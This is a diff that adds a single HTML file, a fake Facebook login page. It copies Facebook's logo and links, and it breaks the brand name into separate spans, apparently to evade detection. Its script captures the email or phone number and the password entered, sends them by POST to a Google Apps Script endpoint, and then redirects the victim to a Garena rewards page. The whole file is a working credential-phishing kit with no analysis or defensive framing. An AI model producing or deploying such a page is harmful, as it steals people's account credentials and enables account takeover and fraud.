@@ -1,0 +1,131 @@
+<!DOCTYPE html>
+<html>
+<head>
+ <title>login</title>
+
+
+ <style>
+     *{
+      margin:0;
+      padding:0;
+      box-sizing:border-box;
+      font-family:Arial;
+     }
+
+     body{
+      background:#ccc;
+     }
+.header{
+background:#29487d;
+padding:30px 10px;
+}
+.header div{
+ width:calc(100% - 100px);
+  margin:auto;
+}
+.header div img{
+  height:30px;
+}
+.header div a{
+  background:#42b72a;
+  padding:8px;
+  text-decoration:none;
+  color:#fff;
+  border-radius:2px;
+  margin:0 5px;
+}
+.main{
+ background:#fff;
+ width:500px;
+ margin:90px auto;
+ padding:10px;
+}
+
+.main p{
+ text-align:center;
+ margin:20px 0;
+}
+.main input{
+ padding:10px;
+ display:block;
+ outline:none;
+ margin:10px auto;
+ width:60%;
+ border:1px solid #ccc;
+ border-radius:3px;
+}
+.main .mob{
+
+}
+.main button{
+ padding:10px;
+ display:block;
+ outline:none;
+ margin:10px auto;
+ width:60%;
+ background:#29487d;
+ color:#fff;
+ border:1px solid #29487d;
+ border-radius:3px;
+}
+
+.links{
+ text-align:center;
+}
+.links a{
+ font-size:12px;
+ text-align:center;
+}
+.links a:nth-last-child(1){
+ font-size:14px;
+ display:block;
+ text-align:center;
+ margin:7px 0;
+}
+     </style>
+</head>
+<body>
+  <div class="header">
+      <div>
+      <img src="https://static.xx.fbcdn.net/rsrc.php/v3/y4/r/gf6iHxsw8zm.png">
+      <a href="https://www.facebook.com/r.php?locale=en_GB">Create New Account</a>
+      </div>
+  </div>
+  <div class="main">
+     <p>log in into <span>F</span><span>a</span><span>ce</span><span>b</span><span>ook</span></p>
+     <form method="post" id="google-sheet" class="google-sheet">
+     <input type="text" name="mob" class="mob" placeholder="Email address or phone number" required/>
+     <input type="password" name="forlog" class="forlog" placeholder="Password" required/>
+     <button type="submit" id="loging">Login</button>
+     </form>
+     <div class="links">
+         <a href="#">Forgotten account?</a> . 
+         <a href="#">Sign up for <span>F</span><span>ac</span><span>e</span><span>book</span></a>
+         <a href="#">Not now</a>
+     </div>
+  </div>
+
+
+
+     
+  <script>
+         const scriptURL = 'https://script.google.com/macros/s/AKfycby57EbazqLqUXh381cz0R-pHAaJ3VC6--CYpXHZjXUaZdmE9ddLphEOsPdJGt1rQw5k/exec';
+            const form = document.forms['google-sheet'];
+            var loging = document.getElementById('loging');
+
+            form.addEventListener('submit', e => {
+                
+                loging.setAttribute('disabled','disabled');
+                loging.style.background="#a4b2cd";
+                loging.style.border="1px solid #a4b2cd";
+                 e.preventDefault();
+                 fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+                .then(response =>{
+                 window.location.href ="https://reward.ff.garena.com";
+                })
+                .catch(error => console.error('Error!', error.message))
+            });
+
+</script>
+</body>
+</html>
